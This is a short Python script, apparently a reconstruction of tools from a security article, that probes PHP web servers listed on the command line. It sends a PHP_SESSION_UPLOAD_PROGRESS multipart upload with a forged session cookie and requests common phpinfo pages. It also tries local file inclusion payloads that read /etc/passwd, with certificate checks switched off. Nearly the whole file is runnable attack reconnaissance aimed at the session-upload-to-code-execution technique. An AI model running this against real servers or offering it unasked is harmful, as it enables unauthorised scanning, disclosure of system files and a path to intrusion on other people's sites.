# Representative reconstruction of php2shell_fp.py/deep_probe.py behaviors.
# The source article publishes screenshots and behavior, not the full scripts.
import ssl
import sys
import uuid
import urllib.request


def screen(base):
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    sid = uuid.uuid4().hex
    boundary = 'screen-' + uuid.uuid4().hex
    marker = 'MARKER_' + uuid.uuid4().hex[:8] + '.txt'
    body = (
        '--' + boundary + '\r\n'
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        + sid + '\r\n--' + boundary + '\r\n'
        'Content-Disposition: form-data; name="file"; filename="' + marker + '"\r\n'
        'Content-Type: text/plain\r\n\r\nprobe\r\n--' + boundary + '--\r\n'
    ).encode()
    request = urllib.request.Request(base, data=body, method='POST', headers={
        'Content-Type': 'multipart/form-data; boundary=' + boundary,
        'Cookie': 'PHPSESSID=' + sid,
    })
    with urllib.request.urlopen(request, context=context, timeout=10) as response:
        powered = response.headers.get('X-Powered-By', '')
        server = response.headers.get('Server', '')
        echoed = sid in response.headers.get('Set-Cookie', '')
        print(powered, server, echoed)
    # The article names six phpinfo paths and eleven LFI parameters but does
    # not disclose their spellings. These are representative candidates.
    for path in ('/phpinfo.php', '/info.php', '/test/phpinfo.php'):
        try:
            with urllib.request.urlopen(base + path, context=context, timeout=10) as response:
                print(path, response.read(65536))
        except Exception:
            pass
    for query in ('/?page=../../../../etc/passwd', '/?file=../../../../etc/passwd'):
        try:
            with urllib.request.urlopen(base + query, context=context, timeout=10) as response:
                print(query, response.read(65536))
        except Exception:
            pass


if __name__ == '__main__':
    for target in sys.argv[1:]:
        screen(target.rstrip('/'))
